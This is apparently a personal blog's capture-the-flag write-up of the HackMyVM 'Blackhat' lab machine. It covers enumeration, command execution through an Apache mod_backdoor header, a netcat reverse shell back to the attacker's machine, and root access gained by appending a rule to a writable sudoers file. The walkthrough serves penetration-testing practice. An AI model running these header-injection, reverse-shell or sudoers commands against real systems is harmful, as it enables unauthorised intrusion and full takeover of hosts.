---
title: Write-up Blackhat on HackMyVM
author: eMVee
date: 2024-01-05 22:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, backdoor, sudoers file, mod_backdoor]
render_with_liquid: false
---

Tonight it's time to do another box from HackMyVM. By filtering with tags I came across an interesting name: Blackhat. This machine is classified as easy and is made by cromiphi. He has already made several good machines, so I definitely want to try to hack this one too.

## Getting started
We start again by creating a working directory for the Blackhat machine. This is where we store all our information and files that we need to hack the machine.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/         

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Blackhat

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Blackhat      
```
Next we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 320sec preferred_lft 320sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:94:4d:bf:97 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```
This time I decided to check the IP addresses on our virtual network with an arp-scan.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ sudo arp-scan --localnet           
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:0e:ca:e6, IPv4: 10.0.2.15
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:20:83:62       PCS Systemtechnik GmbH
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.40       08:00:27:35:47:79       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.648 seconds (96.68 hosts/sec). 4 responded

```
One IP address is not familiar to me. This must be the target. We can create a variable and assign the IP address to the variable. Next we can see if the target is responding to our ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ ip=10.0.2.40

┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ ping -c 3 $ip                     
PING 10.0.2.40 (10.0.2.40) 56(84) bytes of data.
64 bytes from 10.0.2.40: icmp_seq=1 ttl=64 time=1.00 ms
64 bytes from 10.0.2.40: icmp_seq=2 ttl=64 time=0.910 ms
64 bytes from 10.0.2.40: icmp_seq=3 ttl=64 time=1.22 ms

--- 10.0.2.40 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.910/1.043/1.219/0.129 ms
```
Based on the value 64 in the ttl field we can tell that the target is probably running on a Linux operating system.
## Enumeration
Our next step is identifying open ports and running services. We can do this by running a port scan with nmap.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 21:13 CET
Nmap scan report for 10.0.2.40
Host is up (0.00081s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title:  Hacked By HackMyVM
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:35:47:79 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 10.0.2.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds

```
There are not many ports open on this machine. We should take some notes on the results.

- Linux, probably a Debian
- Port 80
	- HTTP
	- Apache 2.4.54
	- Title: Hacked By HackMyVM

Next we should try to identify some more details on the website and webserver with whatweb.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ whatweb http://$ip
http://10.0.2.40 [200 OK] Apache[2.4.54], Country[RESERVED][ZZ], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.0.2.40], JQuery[1.10.2], Script, Title[Hacked By HackMyVM], X-UA-Compatible[IE=edge]  
```
Unfortunately, we didn't discover more than we already knew. Perhaps nikto can help us identifying some juicy informaiton.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ nikto -h $ip   
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.40
+ Target Hostname:    10.0.2.40
+ Target Port:        80
+ Start Time:         2024-01-05 21:16:40 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.54 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 59d, size: 5edce4c6f946a, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-01-05 21:17:21 (GMT1) (41 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Nikto did discover an interesting file what we should inspect.
- /phpinfo.php


Let's visit the website in the browser.

![image](/assets/img/WriteUp/HackMyVM/Blackhat/Pasted image 20240105212316.png){: width="700" height="400" }

It looks like the HackMyVM team has hacked the website and defaced it.  Next we should check the phpinfo file what was discovered by nikto. In this file most often interesting information can be found.

![image](/assets/img/WriteUp/HackMyVM/Blackhat/Pasted image 20240105212404.png){: width="700" height="400" }

We have identified a PHP version. We should add this to our notes.
- PHP 7.4.30

We should inspect the phpinfo file further for juicy information.

![image](/assets/img/WriteUp/HackMyVM/Blackhat/Pasted image 20240105212506.png){: width="700" height="400" }

While scrolling through the phpinfo file a strange module is loaded.
- mod_backdoor

We should do a bit research on this module.

```
https://www.google.com/search?q=mod_backdoor
```
There are multiple kind of backdoors for modules.
Source 1:
```
https://github.com/VladRico/apache2_BackdoorMod
```
Source 2:
```
https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor
```

While reading the [exploit](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/master/exploit.py) it tells us that we can sent command injections with our own header.
We should try that with curl and the whoami command.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ curl -H 'Backdoor: whoami' http://10.0.2.40/
www-data

```
It looks like we can execute commands as 'www-data'.  Next we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ sudo rlwrap nc -lvnp 443           
[sudo] password for emvee: 
listening on [any] 443 ...

```

## Initial access
When everything is set we should start our reverse shell command.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ curl -H 'Backdoor: nc 10.0.2.15 443 -c /bin/bash' http://10.0.2.40/


```
Now we have to check the netcat listener and check some basic information about who we are, where we are working on and what directory we are working in.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Blackhat]
└─$ sudo rlwrap nc -lvnp 443           
[sudo] password for emvee: 
listening on [any] 443 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.40] 54214
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
hostname
blackhat
pwd
/
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:35:47:79 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.40/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 381sec preferred_lft 381sec
    inet6 fe80::a00:27ff:fe35:4779/64 scope link 
       valid_lft forever preferred_lft forever

```

Let's upgrade the shell a little bit.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@blackhat:/$ 

```
One of my first steps is to identify user home directories with associated files. This can be done with the command `ls -ahlR /home`.
```bash
www-data@blackhat:/$ ls -ahlR /home
ls -ahlR /home
/home:
total 12K
drwxr-xr-x  3 root      root      4.0K Nov 11  2022 .
drwxr-xr-x 18 root      root      4.0K Nov 10  2022 ..
drwxr-xr-x  3 darkdante darkdante 4.0K Nov 13  2022 darkdante

/home/darkdante:
total 28K
drwxr-xr-x 3 darkdante darkdante 4.0K Nov 13  2022 .
drwxr-xr-x 3 root      root      4.0K Nov 11  2022 ..
lrwxrwxrwx 1 root      root         9 Nov 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 darkdante darkdante  220 Nov 11  2022 .bash_logout
-rw-r--r-- 1 darkdante darkdante 3.5K Nov 11  2022 .bashrc
drwxr-xr-x 3 darkdante darkdante 4.0K Nov 11  2022 .local
-rw-r--r-- 1 darkdante darkdante  807 Nov 11  2022 .profile
-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt

/home/darkdante/.local:
total 12K
drwxr-xr-x 3 darkdante darkdante 4.0K Nov 11  2022 .
drwxr-xr-x 3 darkdante darkdante 4.0K Nov 13  2022 ..
drwx------ 3 darkdante darkdante 4.0K Nov 11  2022 share
ls: cannot open directory '/home/darkdante/.local/share': Permission denied
www-data@blackhat:/$ 

```
We can see that the user flag is present in the home directory of the user 'darkdante'. The permissions on this file don't allow us to read the file as 'www'-data'. We also want to know which users are present on the system. The users can be found in '/etc/passwd', among other places.

```bash
www-data@blackhat:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
darkdante:x:1000:1000:,,,:/home/darkdante:/bin/bash

```
We can see that 'darkdante' is a regular user. The user's ID is 1000. The first user is usually a sudo user, so in a sense this is a user we should be interested in. Let's see if we can use the switch user `su` command. First, we could also use the username as a password. Then we could guess any obvious passwords. But not too much, because then we would be better off using a script since there is no SSH port open.

```bash
www-data@blackhat:/$ su darkdante
su darkdante
darkdante@blackhat:/$ 

```

We did not have to use any password to switch to user 'darkdante'. Lucky us!
Let's change our working directory and go to the user's home directory. This is where the user flag is located that we still have to capture.

```bash
darkdante@blackhat:/$ cd ~
cd ~
darkdante@blackhat:~$ cat user.txt
cat user.txt
HERE IS THE USER FLAG
```
Because a user with ID 1000 is often a sudo user, we first have to see whether we can perform something as a sudo user. We can do this with `sudo -l`.
```bash
darkdante@blackhat:~$ sudo -l
sudo -l
Sorry, user darkdante may not run sudo on blackhat.
darkdante@blackhat:~$ 

```
Unfortunately we can't do anything with sudo as darkdante. So we must continue to look for a path that leads us to more rights.

Maybe there are writable files on the system that we can use. Let's see if we see anything that might be interesting.
```bash
darkdante@blackhat:~$ find / -writable -type f 2>/dev/null
find / -writable -type f 2>/dev/null
/proc/sys/kernel/ns_last_pid
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/task/1/attr/apparmor/current
/proc/1/task/1/attr/apparmor/exec
/proc/1/attr/current
/proc/1/attr/exec


<-- SNIP -->


/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/memory.oom.group
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/memory.max
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/memory.high
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/pids.max
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
/etc/sudoers
darkdante@blackhat:~$ 

```

It looks like we are lucky and can edit the sudoers file.
This is an easy privilege escalation for us as attackers. We only have to add our selves to the sudoers file. The command to do this looks like this: 

```
echo 'darkdante    ALL=(ALL:ALL) ALL' >> /etc/sudoers
```


## Privilege escalation
Now we have to execute the command on our target. and check if we are added into the sudoers file.
```bash
darkdante@blackhat:~$ echo 'darkdante    ALL=(ALL:ALL) ALL' >> /etc/sudoers
echo 'darkdante    ALL=(ALL:ALL) ALL' >> /etc/sudoers
darkdante@blackhat:~$ sudo cat /etc/sudoers
sudo cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d

darkdante    ALL=(ALL:ALL) ALL
```
Finally we should switch user to root, double check who we are and capture the root flag!
```bash
darkdante@blackhat:~$ sudo su
sudo su
root@blackhat:/home/darkdante# cd ~
cd ~
root@blackhat:~# whoami
whoami
root
root@blackhat:~# cat root.txt
cat root.txt
HERE IS THE ROOT FLAG

```
We pwned this box!